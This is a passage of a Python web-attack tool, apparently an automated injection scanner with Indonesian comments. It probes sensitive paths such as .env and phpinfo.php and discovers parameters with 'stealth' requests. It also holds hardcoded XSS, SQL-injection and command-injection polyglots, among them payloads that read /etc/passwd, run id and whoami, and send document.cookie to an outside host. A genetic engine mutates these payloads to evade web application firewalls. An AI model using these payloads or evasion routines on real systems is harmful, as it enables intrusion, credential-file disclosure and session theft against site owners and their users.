                        "method": (form_node.attributes.get("method", "GET") or "GET").upper(),
                        "id": form_node.attributes.get("id", ""),
                        "inputs": []
                    }
                    for inp in form_node.css("input, textarea, select"):
                        inp_type = inp.attributes.get("type", "text")
                        if inp_type in ("submit", "button", "image", "reset"):
                            continue
                        form_data["inputs"].append({
                            "name": inp.attributes.get("name", ""),
                            "type": inp_type,
                            "value": inp.attributes.get("value", ""),
                        })
                    forms.append(form_data)
                return forms
            except Exception:
                pass
        return forms

    @staticmethod
    def extract_links(html: str) -> list:
        """Ekstrak semua href dari tag <a>. Return list of str."""
        links = []
        if HAS_SELECTOLAX:
            try:
                tree = SelectoParser(html)
                for a_node in tree.css("a[href]"):
                    href = a_node.attributes.get("href", "")
                    if href:
                        links.append(href)
                return links
            except Exception:
                pass
        # Fallback: regex
        links = re.findall(r'<a[^>]+href=["\']([^"\']+)["\']', html, re.I)
        return links

    @staticmethod
    def extract_scripts_src(html: str) -> list:
        """Ekstrak semua src dari tag <script>. Return list of str."""
        srcs = []
        if HAS_SELECTOLAX:
            try:
                tree = SelectoParser(html)
                for script_node in tree.css("script[src]"):
                    src = script_node.attributes.get("src", "")
                    if src:
                        srcs.append(src)
                return srcs
            except Exception:
                pass
        srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)
        return srcs

# ============================================================
# CONCURRENT ENDPOINT SCANNER (v7.0 — ThreadPoolExecutor + HTTPAdapter/Retry)
# ============================================================
class ConcurrentEndpointScanner:
    """Memindai daftar path secara paralel menggunakan thread worker."""
    """
    Parallel endpoint discovery.
    - ThreadPoolExecutor  → probing concurrent
    - HTTPAdapter + Retry → connection pooling + auto-retry pada 429/5xx
    """

    DEFAULT_PATHS = [
        "admin", "login", "api", "search", "user", "profile",
        "upload", "config", "backup", "test", "debug", "dev",
        "api/v1", "api/v2", "robots.txt", "sitemap.xml",
        ".env", "phpinfo.php", "info.php",
    ]

    def __init__(self, base_url: str, max_workers: int = 8, timeout: float = 5.0):
        self.base_url = base_url.rstrip("/")
        self.max_workers = max_workers
        self.timeout = timeout
        self.discovered = []
        self._session = None

    def _build_resilient_session(self):
        """requests.Session dengan HTTPAdapter + Retry (pooling + auto-retry)."""
        if requests is None:
            return None
        session = requests.Session()
        # Kompatibilitas urllib3 lama/baru: allowed_methods vs method_whitelist
        try:
            retry_strategy = Retry(
                total=3,
                backoff_factor=0.5,
                status_forcelist=[429, 500, 502, 503, 504],
                allowed_methods=["GET", "HEAD"],
                raise_on_status=False,
            )
        except TypeError:
            retry_strategy = Retry(
                total=3,
                backoff_factor=0.5,
                status_forcelist=[429, 500, 502, 503, 504],
                method_whitelist=["GET", "HEAD"],
                raise_on_status=False,
            )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=10,
            pool_maxsize=10,
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _probe(self, path: str):
        """Probe satu endpoint. Return dict jika hidup, selain itu None."""
        if self._session is None:
            return None
        url = f"{self.base_url}/{path.lstrip('/')}"
        try:
            resp = self._session.get(url, timeout=self.timeout, allow_redirects=False)
            if resp.status_code < 400:
                return {
                    "url": url,
                    "path": path,
                    "status_code": resp.status_code,
                    "length": len(resp.content or b""),
                }
        except Exception:
            pass
        return None

    def scan(self, paths=None):
        """Parallel scan dengan ThreadPoolExecutor + as_completed."""
        if requests is None:
            return []
        if self._session is None:
            self._session = self._build_resilient_session()
            if self._session is None:
                return []
        targets = paths if paths else self.DEFAULT_PATHS
        self.discovered = []
        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                future_map = {executor.submit(self._probe, p): p for p in targets}
                for future in as_completed(future_map):
                    try:
                        result = future.result()
                        if result:
                            self.discovered.append(result)
                    except Exception:
                        continue
        except Exception:
            pass
        return self.discovered

# ============================================================
# ASYNC ENDPOINT SCANNER (v7.0 — aiohttp)
# ============================================================
class AsyncEndpointScanner:
    """Memindai daftar path secara asynchronous dengan batas concurrency."""
    """
    Async endpoint discovery menggunakan aiohttp.
    Lebih cepat dari ConcurrentEndpointScanner untuk target
    dengan banyak endpoint karena I/O concurrency.
    """

    DEFAULT_PATHS = ConcurrentEndpointScanner.DEFAULT_PATHS

    def __init__(self, base_url: str, timeout: float = 5.0, max_concurrent: int = 20):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.discovered = []

    async def _probe_one(self, session, path: str):
        """Probe satu endpoint secara async."""
        url = f"{self.base_url}/{path.lstrip('/')}"
        try:
            async with session.get(
                url,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                allow_redirects=False
            ) as resp:
                if resp.status < 400:
                    body = await resp.read()
                    return {
                        "url": url,
                        "path": path,
                        "status_code": resp.status,
                        "length": len(body),
                    }
        except Exception:
            pass
        return None

    async def _scan_async(self, paths: list):
        """Jalankan semua probe secara concurrent dengan semaphore."""
        semaphore = asyncio.Semaphore(self.max_concurrent)
        results = []

        async def bounded_probe(session, path):
            async with semaphore:
                return await self._probe_one(session, path)

        connector = aiohttp.TCPConnector(limit=self.max_concurrent, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [bounded_probe(session, p) for p in paths]
            completed = await asyncio.gather(*tasks, return_exceptions=True)
            for result in completed:
                if isinstance(result, dict):
                    results.append(result)
        return results

    def scan(self, paths=None):
        """Entry point synchronous — menjalankan event loop di dalamnya."""
        if not HAS_AIOHTTP:
            return []
        import asyncio
        targets = paths if paths else self.DEFAULT_PATHS
        self.discovered = []
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            self.discovered = loop.run_until_complete(self._scan_async(targets))
            loop.close()
        except Exception:
            pass
        return self.discovered

# ============================================================
# PAYLOAD DIVERSITY ENGINE (v7.0 — string + itertools + quote_plus)
# ============================================================
class PayloadDiversityEngine:
    """Membuat variasi payload melalui padding dan kombinasi encoding."""
    """
    Menghasilkan variasi payload tambahan menggunakan:
    - string.ascii_letters/digits/punctuation untuk junk injection
    - itertools.product untuk kombinasi encoding multi-layer
    - quote_plus untuk encoding alternatif (space → +)
    """
    
    ENCODING_FUNCS = {
        "raw": lambda s: s,
        "quote_plus": lambda s: quote_plus(s, safe=""),
        "hex": lambda s: "".join(f"%{ord(c):02x}" for c in s),
        "html_entity": lambda s: "".join(f"&#{ord(c)};" for c in s),
    }
    
    def generate_junk_padding(self, payload: str, density: float = 0.15) -> str:
        """Sisipkan karakter junk dari string module ke dalam payload."""
        junk_chars = string.ascii_letters + string.digits
        result = list(payload)
        insertions = max(1, int(len(payload) * density))
        for _ in range(insertions):
            pos = random.randint(0, len(result))
            result.insert(pos, random.choice(junk_chars))
        return "".join(result)
    
    def generate_encoding_combinations(self, payload: str, max_depth: int = 2) -> List[str]:
        """Gunakan itertools.product untuk menghasilkan semua kombinasi encoding."""
        variants = []
        encoding_names = list(self.ENCODING_FUNCS.keys())
        for depth in range(1, max_depth + 1):
            for combo in itertools.product(encoding_names, repeat=depth):
                result = payload
                for enc_name in combo:
                    try:
                        result = self.ENCODING_FUNCS[enc_name](result)
                    except Exception:
                        break
                if result != payload:
                    variants.append(result)
        return variants[:10]  # Batasi 10 varian
    
    def quote_plus_encode(self, payload: str) -> str:
        """Encoding alternatif: space → +, karakter khusus → %XX."""
        return quote_plus(payload, safe="'\"")
    
    def diversify_batch(self, payloads: List[Dict], count: int = 5) -> List[Dict]:
        """Hasilkan batch payload diversifikasi dari populasi yang ada."""
        if not payloads:
            return []
        diversified = []
        sources = random.sample(payloads, min(count, len(payloads)))
        for i, src in enumerate(sources):
            original = src.get("payload", "")
            if not original:
                continue
            method = random.choice(["junk", "combo", "quote_plus"])
            if method == "junk":
                new_payload = self.generate_junk_padding(original)
            elif method == "combo":
                combos = self.generate_encoding_combinations(original, max_depth=1)
                new_payload = random.choice(combos) if combos else original
            else:
                new_payload = self.quote_plus_encode(original)
            # v7.0 (Batch 8): Dedup via scipy_cosine — skip jika terlalu mirip
            # dengan payload yang sudah ada di batch ini
            is_dup = False
            if HAS_SCIPY:
                try:
                    detector = StatisticalAnomalyDetector()
                    for existing in diversified:
                        dist = detector.payload_cosine_distance(new_payload, existing["payload"])
                        if dist < 0.05:  # cosine distance < 5% → terlalu mirip
                            is_dup = True
                            break
                except Exception:
                    pass
            if is_dup:
                continue

            diversified.append({
                "id": f"DIV-{random.randint(10000,99999)}",
                "payload": new_payload,
                "category": src.get("category", "xss"),
                "length_tier": "diversified",
                "encoding": method,
                "strategy": f"diversity_{method}",
                "length": len(new_payload),
                "hash": hashlib.md5(new_payload.encode(errors='ignore')).hexdigest(),
                "built_from_scratch": False,
                "timestamp": datetime.now().isoformat(),
            })
        return diversified

# ============================================================
# POLYGLOT GENERATOR (preserved from v5.0)
# ============================================================
class PolyglotGenerator:
    """Menghasilkan payload gabungan untuk beberapa konteks parser."""
    def generate_sql_xss_polyglot(self) -> List[str]:
        return [
            "';alert(1);//", "';</script><script>alert(1)</script>;//",
            "'-alert(1)-'", "\"--></script><svg/onload=alert(1)>",
            "';var x=new Image();x.src='http://x.test/'+document.cookie;//",
            "'><img src=x onerror=alert(1)>", "'-confirm(1)-'",
            "1'<script>alert(1)</script>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)/>\\x3e",
            "'{{7*7}}'<script>alert(1)</script>",
        ]

    def generate_sqli_lfi_polyglot(self) -> List[str]:
        return [
            "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -",
            "1' AND 1=0 UNION SELECT NULL,CONCAT(0x7e,LOAD_FILE('/etc/passwd'),0x7e)-- -",
        ]

    def generate_cmdi_sqli_polyglot(self) -> List[str]:
        return ["';sleep 5;echo $(id);--", "1;cat /etc/passwd;SELECT SLEEP(5)--",
                "'||`id`||'", "';$(whoami);-- -"]

    def generate_universal_polyglots(self) -> List[str]:
        return [
            "\"><script>alert(1)</script>' OR 1=1--",
            "'-alert(1)-' OR '1'='1",
            "1%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
            "'\"></script><script>alert(1)</script><!--",
            "1\"><img src=x onerror=alert(1)><!--' OR '1'='1",
        ]

    def generate_all_polyglots(self) -> List[Dict]:
        all_payloads = []
        polyglot_groups = [
            ("sql_xss", self.generate_sql_xss_polyglot()),
            ("sqli_lfi", self.generate_sqli_lfi_polyglot()),
            ("cmdi_sqli", self.generate_cmdi_sqli_polyglot()),
            ("universal", self.generate_universal_polyglots()),
        ]
        counter = 0
        for group_name, payloads in polyglot_groups:
            for payload in payloads:
                counter += 1
                all_payloads.append({
                    "id": f"POLY-{counter:04d}", "payload": payload,
                    "category": "polyglot", "length_tier": "polyglot",
                    "encoding": "raw", "strategy": group_name,
                    "length": len(payload),
                    "hash": hashlib.md5(payload.encode(errors='ignore')).hexdigest(),
                    "built_from_scratch": True, "is_polyglot": True,
                    "timestamp": datetime.now().isoformat(),
                })
        return all_payloads


# ============================================================
# GENETIC EVOLVER (preserved from v5.0)
# ============================================================
class GeneticEvolver:
    """Mengembangkan populasi payload melalui seleksi, crossover, dan mutasi."""
    def __init__(self, schema: EvolutionSchema, grammar: GrammarValidator,
                 encoder: AdaptiveEncodingRotation, waf_bypass: WAFBypassEngine, waf_inference: WAFSignatureInference = None):
        self.schema = schema
        self.grammar = grammar
        self.encoder = encoder
        self.waf_bypass = waf_bypass
        self.waf_inference = waf_inference

        # v6.1 NEW: Inisialisasi Multi-Armed Bandit (UCB1)
        self.bandit = MutationBanditSelector(
            mutation_types=[
                "case_variation", "comment_insertion", "whitespace_padding",
                "char_encoding", "null_byte_append", "double_encoding",
                "keyword_split", "alternative_syntax", "newline_injection",
                "tab_separation", "url_encode", "hex_encode",
                "hpp_split", "control_char_insert", "waf_fragment"
            ]
        )
        
        self.population: List[Dict] = []
        self.generation = 0
        self.elitism_rate = 0.15
        self.max_population = 200
        self.tournament_size = 5
        self.crossover_rate = 0.4
        self.mutation_rate = 0.3
        # v6.1 NEW: Reference to LSTM (will be injected from Pipeline)
        self.lstm_generator = None

    def generate_lstm_candidates(self, num_candidates: int = 10) -> List[Dict]:
        """Generate new payload candidates using the trained LSTM model."""
        # v7.0 FIX: atribut asli adalah 'trained', bukan 'is_trained'
        if not self.lstm_generator or not getattr(self.lstm_generator, 'trained', False):
            return []
        
        candidates = []
        seeds = ["' OR ", "' UNION ", "1; DROP ", "admin'--", "' AND ", "'; SELECT "]
        
        try:
            # v7.0 FIX: generate() return str per-call, bukan list
            for i in range(num_candidates):
                seed = random.choice(seeds)
                length = random.randint(15, 60)
                payload = self.lstm_generator.generate(seed=seed, length=length)
                
                if not payload:
                    continue
                
                payload = payload.strip()
                if not payload or len(payload) < 5:
                    continue
                
                # Validasi: pastikan mengandung unsur SQL-like
                sql_indicators = ["'", "\"", "OR", "AND", "SELECT", "UNION", ";", "--", "="]
                if not any(ind.lower() in payload.lower() for ind in sql_indicators):
                    continue
                
                candidates.append({
                    "payload": payload,
                    "category": "lstm_generated",
                    "generation": self.generation + 1,
                    "mutation_history": ["lstm_synthesis"],
                    "hash": hash(payload)
                })
        except Exception:
            pass  # Silently fail if LSTM generation errors out
            
        return candidates   
 
    def initialize_population(self, payloads: List[Dict]):
        self.population = payloads[:self.max_population]
        self.generation = 1

    def tournament_select(self) -> Dict:
        candidates = random.sample(self.population,
                                  min(self.tournament_size, len(self.population)))
        candidates.sort(key=lambda p: p.get("fitness", 0.5), reverse=True)
        return candidates[0]

    def crossover(self, parent1: Dict, parent2: Dict) -> List[Dict]:
        p1 = parent1.get("payload", "")
        p2 = parent2.get("payload", "")
        cat1 = parent1.get("category", "xss")
        cat2 = parent2.get("category", "xss")
        children = []
        if cat1 == cat2:
            children.extend(self._structural_crossover(p1, p2, cat1))
        else:
            children.extend(self._cross_category_crossover(parent1, parent2))
        valid_children = []
        for child in children:
            is_valid, reason = self.grammar.validate(child["payload"], child["category"])
            if is_valid:
                valid_children.append(child)
        return valid_children

    def _structural_crossover(self, p1: str, p2: str, category: str) -> List[Dict]:
        children = []
        if category == "sqli":
            p1_parts = re.split(r'(/\*.*?\*/|--|#)', p1)
            p2_parts = re.split(r'(/\*.*?\*/|--|#)', p2)
            if len(p1_parts) >= 2 and len(p2_parts) >= 2:
                mid1 = len(p1_parts) // 2
                mid2 = len(p2_parts) // 2
                child1 = "".join(p1_parts[:mid1] + p2_parts[mid2:])
                child2 = "".join(p2_parts[:mid2] + p1_parts[mid1:])
                for child_payload in [child1, child2]:
                    if child_payload and len(child_payload) > 5:
                        children.append({
                            "id": f"GEN-{self.generation}-{len(children):04d}",
                            "payload": child_payload, "category": category,
                            "length_tier": "evolved", "encoding": "crossover",
                            "strategy": "ast_crossover", "length": len(child_payload),
                            "hash": hashlib.md5(child_payload.encode(errors='ignore')).hexdigest(),
                            "built_from_scratch": False, "parent_ids": [],
                            "generation": self.generation,
                            "timestamp": datetime.now().isoformat(),
                        })
        elif category == "xss":
            p1_tags = re.findall(r'<[^>]+>', p1)
            p2_tags = re.findall(r'<[^>]+>', p2)
            if p1_tags and p2_tags:
                combined = p1_tags[0] + p2_tags[-1] if len(p2_tags) > 1 else p2_tags[0]
                children.append({
                    "id": f"GEN-{self.generation}-XSS-{len(children):04d}",
                    "payload": combined, "category": "xss",
                    "length_tier": "evolved", "encoding": "crossover",
                    "strategy": "tag_crossover", "length": len(combined),
                    "hash": hashlib.md5(combined.encode(errors='ignore')).hexdigest(),
                    "built_from_scratch": False, "generation": self.generation,
                    "timestamp": datetime.now().isoformat(),
                })
        if not children and len(p1) > 5 and len(p2) > 5:
            mid1 = len(p1) // 2; mid2 = len(p2) // 2
            child = p1[:mid1] + p2[mid2:]
            children.append({
                "id": f"GEN-{self.generation}-FALL-{len(children):04d}",
                "payload": child, "category": category,
                "length_tier": "evolved", "encoding": "crossover",
                "strategy": "simple_crossover", "length": len(child),
                "hash": hashlib.md5(child.encode(errors='ignore')).hexdigest(),
                "built_from_scratch": False, "generation": self.generation,
                "timestamp": datetime.now().isoformat(),
            })
        return children

    def _cross_category_crossover(self, p1: Dict, p2: Dict) -> List[Dict]:
        children = []
        if {p1.get("category"), p2.get("category")} == {"xss", "sqli"}:
            sqli = p1 if p1.get("category") == "sqli" else p2
            xss = p1 if p1.get("category") == "xss" else p2
            polyglot = f"{sqli['payload'][:30]}{xss['payload'][:30]}"
            children.append({
                "id": f"GEN-{self.generation}-POLY-{len(children):04d}",
                "payload": polyglot, "category": "polyglot",
                "length_tier": "evolved", "encoding": "crossover",
                "strategy": "cross_category", "length": len(polyglot),
                "hash": hashlib.md5(polyglot.encode(errors='ignore')).hexdigest(),
                "built_from_scratch": False, "generation": self.generation,
                "timestamp": datetime.now().isoformat(),
            })
        return children

    def mutate(self, payload_dict: Dict) -> Dict:
        payload = payload_dict.get("payload", "")
        category = payload_dict.get("category", "xss")
        blocked = self.schema.get_blocked_mutations()
        all_mutations = {
            "case_variation": lambda s: "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s),
            "comment_insertion": lambda s: s.replace(" ", random.choice(["/**/", "/*!*/", "/*x*/"]), 1) if " " in s else s,
            "whitespace_padding": lambda s: f"{random.choice([' ', chr(9), '%09'])}{s}{random.choice([' ', '/**/'])}",
            "char_encoding": lambda s: "".join(f"%{ord(c):02x}" if random.random() < 0.2 and c in "'\"<>();" else c for c in s),
            "null_byte_append": lambda s: s + random.choice(["%00", "\\0"]),
            "double_encoding": lambda s: quote(quote(s, safe=""), safe=""),
            "keyword_split": lambda s: self._split_keywords(s),
            "alternative_syntax": lambda s: self._alt_syntax(s, category),
            "newline_injection": lambda s: s[:len(s)//2] + "%0a" + s[len(s)//2:] if len(s) > 5 else s,
            "tab_separation": lambda s: s.replace(" ", "%09") if " " in s else s,
            "url_encode": lambda s: quote(s, safe=""),
            "hex_encode": lambda s: "".join(f"\\x{ord(c):02x}" if random.random() < 0.3 else c for c in s),
            "hpp_split": lambda s: self._hpp_mutate(s),
            "control_char_insert": lambda s: self.waf_bypass.insert_control_chars(s, 0.05),
            "waf_fragment": lambda s: self.waf_bypass.fragment_signature(s, category),
        }
        available = {k: v for k, v in all_mutations.items() if k not in blocked}

        if not available:
            available = all_mutations

        num_muts = random.randint(1, 3)
        mutations_applied = []
        result = payload
        
        # tambahan
        # v6.2: WAF Signature Inference - targeted evasion
        if self.waf_inference and self.waf_inference.inferred_signatures:
            # Coba hasilkan mutasi evasion berdasarkan inferred signatures
            inferred_payload = self.waf_inference.generate_evasion_mutation(payload, category)
            if inferred_payload != payload:
                # Validasi grammar
                is_valid, _ = self.grammar.validate(inferred_payload, category)
                if is_valid:
                    # Gunakan hasil inferensi sebagai base, kurangi jumlah mutasi acak
                    result = inferred_payload
                    # Batasi mutasi tambahan agar tidak merusak evasion
                    num_muts = min(num_muts, 1)
                    # Tandai bahwa ini berasal dari inferensi
                    mutations_applied = ["waf_inference_evasion"]

        # v6.1 NEW: Ambil status WAF dari schema untuk konteks bandit
        waf_type = getattr(self.schema, 'waf_type', '') or ''
        
        for _ in range(num_muts):
            # v6.1 NEW: Gunakan UCB1 Bandit alih-alih random.choice
            mut_name = self.bandit.select_mutation(waf_type=waf_type)
            
            # Fallback: Jika bandit memilih mutasi yang tidak tersedia/diblokir
            if mut_name not in available:
                mut_name = random.choice(list(available.keys()))
                
            try:
                result = available[mut_name](result)
                mutations_applied.append(mut_name)
            except:
                continue

        result = self.encoder.apply_chain(result)

        is_valid, reason = self.grammar.validate(result, category)
        if not is_valid:
            result = payload
        mutated = payload_dict.copy()
        mutated["payload"] = result
        mutated["id"] = f"GEN-{self.generation}-MUT-{random.randint(1000,9999)}"
        mutated["encoding"] = "mutated"
        mutated["strategy"] = "+".join(mutations_applied) if mutations_applied else "none"
        mutated["length"] = len(result)
        mutated["hash"] = hashlib.md5(result.encode(errors='ignore')).hexdigest()
        mutated["mutation_history"] = mutations_applied
        mutated["generation"] = self.generation
        mutated["timestamp"] = datetime.now().isoformat()
        return mutated

    def _split_keywords(self, s: str) -> str:
        keywords = ["SELECT", "UNION", "script", "alert", "onerror", "onload",
                    "FROM", "WHERE", "AND", "OR", "SLEEP", "BENCHMARK"]
        for kw in keywords:
            if kw.lower() in s.lower():
                split_at = random.randint(1, len(kw) - 1)
                sep = random.choice(["/**/", "/*!*/", "%0a", "%09"])
                replacement = f"{kw[:split_at]}{sep}{kw[split_at:]}"
                s = re.sub(re.escape(kw), replacement, s, count=1, flags=re.I)
        return s

    def _alt_syntax(self, s: str, category: str) -> str:
        replacements_sql = {
            "OR": ["||", "OR/**/"], "AND": ["&&", "AND/**/"],
            "SELECT": ["SELECT ALL", "SELECT DISTINCT"],
            "SLEEP": ["BENCHMARK(5000000,MD5(0x1))"],
            "MID": ["SUBSTR", "SUBSTRING"], "CONCAT": ["CONCAT_WS('',''],"],
        }
        replacements_xss = {
            "alert(": ["alert`", "window['alert'](", "self['alert'](",
                       "top['alert'](", "confirm(", "prompt(1,"],
            "onerror": ["onload", "onfocus", "onmouseover", "ontoggle"],
            "script": ["svg", "img", "details", "iframe", "body"],
        }
        reps = replacements_sql if category == "sqli" else replacements_xss if category == "xss" else {}
        for old, alts in reps.items():
            if old.lower() in s.lower():
                s = re.sub(re.escape(old), random.choice(alts), s, count=1, flags=re.I)
        return s

    def _hpp_mutate(self, s: str) -> str:
        if len(s) < 10: return s
        mid = len(s) // 2
        return s[:mid] + "&" + s[mid:]
     
    def evolve_generation(self) -> List[Dict]:
        self.generation += 1
        new_population = []
        sorted_pop = sorted(self.population, key=lambda p: p.get("fitness", 0.5), reverse=True)
        elite_count = max(1, int(len(sorted_pop) * self.elitism_rate))
        new_population.extend(sorted_pop[:elite_count])
        crossover_count = int(len(self.population) * self.crossover_rate)
        for _ in range(crossover_count // 2):
            if len(self.population) < 2: break
            p1 = self.tournament_select(); p2 = self.tournament_select()
            children = self.crossover(p1, p2)
            new_population.extend(children[:2])
        mutation_count = int(len(self.population) * self.mutation_rate)
        for _ in range(mutation_count):
            if not self.population: break
            parent = self.tournament_select()
            child = self.mutate(parent)
            new_population.append(child)
        while len(new_population) < len(self.population):
            if self.population:
                parent = random.choice(self.population)
                child = self.mutate(parent)
                new_population.append(child)
            else: break
        seen = set(); unique = []
        for p in new_population:
            h = p.get("hash", "")
            if h and h not in seen:
                seen.add(h); unique.append(p)
        self.population = unique[:self.max_population]
        return self.population

    def update_fitness(self, payload_id: str, fitness: float):
        for p in self.population:
            if p.get("id") == payload_id:
                p["fitness"] = fitness; break

    def get_generation_summary(self) -> str:
        pop_size = len(self.population)
        avg_fitness = sum(p.get("fitness", 0) for p in self.population) / max(1, pop_size)
        max_fitness = max((p.get("fitness", 0) for p in self.population), default=0)
        categories = Counter(p.get("category", "?") for p in self.population)
        return (f"Gen {self.generation}: pop={pop_size}, "
                f"avg_fit={avg_fitness:.3f}, max_fit={max_fitness:.3f}, "
                f"cats={dict(categories)}")


# ============================================================
# PARAMETER DISCOVERY (preserved from v5.0)
# ============================================================
@dataclass
class Parameter:
    """Mewakili parameter target beserta lokasi dan kategori yang ditemukan."""
    name: str
    location: str
    method: str = "GET"
    url: str = ""
    original_value: str = ""
    input_type: str = "text"
    form_action: str = ""
    form_id: str = ""
    context: Dict[str, Any] = field(default_factory=dict)
    injection_context: str = "unknown"

    def to_dict(self):
        return asdict(self)


class ParameterDiscovery:
    """Menemukan parameter dari URL, form, JavaScript, dan endpoint target."""
    COMMON_PARAMS = [
        "id", "page", "p", "pid", "cid", "uid", "cat", "category",
        "post", "article", "news", "item", "product", "order",
        "q", "search", "s", "query", "keyword", "term",
        "file", "path", "url", "link", "src", "source", "dest",
        "redirect", "return", "next", "callback", "continue",
        "action", "type", "cmd", "exec", "command", "run",
        "user", "username", "email", "name", "pass", "password",
        "token", "key", "session", "auth", "login",
        "lang", "locale", "language", "country",
        "format", "output", "view", "template", "style",
        "data", "input", "value", "content", "text", "msg",
        "dir", "directory", "folder", "root", "document",
        "img", "image", "pic", "pdf", "doc",
        "api", "endpoint", "method", "function", "call",
        "sort", "order_by", "limit", "offset", "start",
        "date", "from", "to", "year", "month", "day",
        "status", "state", "mode", "flag", "option",
        "id_berita", "id_artikel", "id_post", "id_news",
        "id_user", "id_product", "id_category", "id_page",
        "ref", "referer", "debug", "test", "admin",
        "preview", "draft", "print", "export", "download",
    ]
    COMMON_PATHS = [
        "/index.php", "/index.html", "/index.asp", "/index.aspx",
        "/article.php", "/post.php", "/news.php", "/berita.php", "/artikel.php",
        "/page.php", "/product.php", "/search.php", "/detail.php",
        "/read.php", "/view.php", "/show.php", "/display.php",
        "/content.php", "/info.php", "/main.php", "/home.php",
        "/api/v1/search", "/api/v1/users", "/api/v1/posts", "/api/v1/items",
        "/api/search", "/api/users", "/api/posts",
        "/wp-admin/admin-ajax.php", "/wp-login.php",
        "/admin/login.php", "/login.php", "/register.php", "/signup.php",
        "/profile.php", "/user.php", "/dashboard.php",
        "/download.php", "/upload.php", "/report.php",
        "/category.php", "/tag.php", "/archive.php",
        "/komentar.php", "/comment.php", "/feedback.php",
        "/gallery.php", "/album.php", "/photo.php",
        "/cart.php", "/checkout.php", "/payment.php",
    ]

    def __init__(self, target: str):
        self.target = target
        self.parsed = urlparse(target)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.domain = self.parsed.netloc
        self.parameters: List[Parameter] = []
        self.visited_urls = set()
        self.discovered_urls = set()
        self.client = get_stealth_client()
        self.context_detector = ContextDetector()

    def run(self) -> List[Parameter]:
        print(f"\n\033[36m[*]\033[0m Starting DEEP parameter discovery on: \033[1;37m{self.target}\033[0m")
        print(f"    \033[36m[1/10]\033[0m Scanning URL query parameters...")
        self._extract_url_params()
        print(f"    \033[36m[2/10]\033[0m Fetching main page...")
        html = self._fetch_page(self.target)
        if not html:
            alt = self.target.replace("http://", "https://")
            html = self._fetch_page(alt)
            if html:
                self.target = alt
                self.parsed = urlparse(alt)
                self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        if not html:
            print(f"    \033[31m[!]\033[0m Cannot fetch target, continuing with fuzzing...")
        else:
            print(f"    \033[32m[✓]\033[0m Main page fetched ({len(html)} bytes)")
            print(f"    \033[36m[3/10]\033[0m Scanning HTML forms...")
            self._extract_form_params(html)
            print(f"    \033[36m[4/10]\033[0m Scanning hidden parameters...")
            self._extract_hidden_params(html)
            print(f"    \033[36m[5/10]\033[0m Scanning JavaScript endpoints...")
            self._extract_js_endpoints(html)
            print(f"    \033[36m[6/10]\033[0m Deep crawling internal links (2 levels)...")
            self._deep_crawl_links(html)
        print(f"    \033[36m[7/10]\033[0m Scanning robots.txt & sitemap.xml...")
        self._scan_robots_sitemap()
        print(f"    \033[36m[8/10]\033[0m Parameter bruteforce/fuzzing...")
        self._fuzz_parameters()
        print(f"    \033[36m[9/10]\033[0m Scanning common endpoints...")
        self._scan_common_endpoints()
        print(f"    \033[36m[10/10]\033[0m Detecting path-based parameters...")
        self._detect_path_params()
        seen = set(); unique = []
        for p in self.parameters:
            key = f"{p.location}:{p.name}:{p.method}:{p.url}"
            if key not in seen:
                seen.add(key); unique.append(p)
        self.parameters = unique
        print(f"\n    \033[32m[✓]\033[0m DEEP Discovery: \033[1;37m{len(self.parameters)}\033[0m unique parameters")
        return self.parameters

    def _fetch_page(self, url: str) -> Optional[str]:
        if url in self.visited_urls: return None
        self.visited_urls.add(url)
        try:
            if self.client:
                resp = self.client.get(url)
                if resp.status_code < 400: return resp.text
        except Exception: pass
        try:
            if HAS_REQUESTS:
                resp = requests.get(url, headers=get_stealth_headers(),
                                   timeout=20, verify=False)
                if resp.status_code < 400: return resp.text
        except Exception: pass
        return None

    def _fetch_page_raw(self, url: str):
        try:
            if self.client:
                resp = self.client.get(url)
                return resp.text, resp.status_code, len(resp.content)
        except: pass
        try:
            if HAS_REQUESTS:
                resp = requests.get(url, headers=get_stealth_headers(),
                                   timeout=15, verify=False)
                return resp.text, resp.status_code, len(resp.content)
        except: pass
        return None, 0, 0

    def _extract_url_params(self):
        if self.parsed.query:
            params = parse_qs(self.parsed.query)
            for name, values in params.items():
                self.parameters.append(Parameter(
                    name=name, location="url_query", method="GET",
                    url=self.target.split("?")[0],
                    original_value=values[0] if values else "",
                ))

    def _extract_form_params(self, html: str):
        # v7.0 (Batch 8): Gunakan FastHTMLParser (selectolax) jika tersedia
        if HAS_SELECTOLAX:
            try:
                fast_forms = FastHTMLParser.extract_forms(html)
                for form_data in fast_forms:
                    form_url = urljoin(self.target, form_data.get("action", "")) if form_data.get("action") else self.target
                    method = form_data.get("method", "GET")
                    form_id = form_data.get("id", "")
                    for inp in form_data.get("inputs", []):
                        name = inp.get("name", "")
                        if not name:
                            continue
                        inp_type = inp.get("type", "text")
                        loc = "hidden" if inp_type == "hidden" else "form_input"
                        self.parameters.append(Parameter(
                            name=name, location=loc, method=method, url=form_url,
                            original_value=inp.get("value", ""), input_type=inp_type,
                            form_action=form_data.get("action", ""), form_id=form_id,
                            context={"form_id": form_id, "input_type": inp_type, "parser": "selectolax"},
                        ))
                return  # Sudah diekstrak via selectolax, skip bs4
            except Exception:
                pass
        # Fallback: BeautifulSoup
        if not HAS_BS4: return
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action", "")
            form_url = urljoin(self.target, action) if action else self.target
            method = form.get("method", "GET").upper()
            form_id = form.get("id", "") or form.get("name", "")
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name", "")
                if not name: continue
                inp_type = inp.get("type", "text")
                if inp_type in ["submit", "button", "image", "reset"]: continue
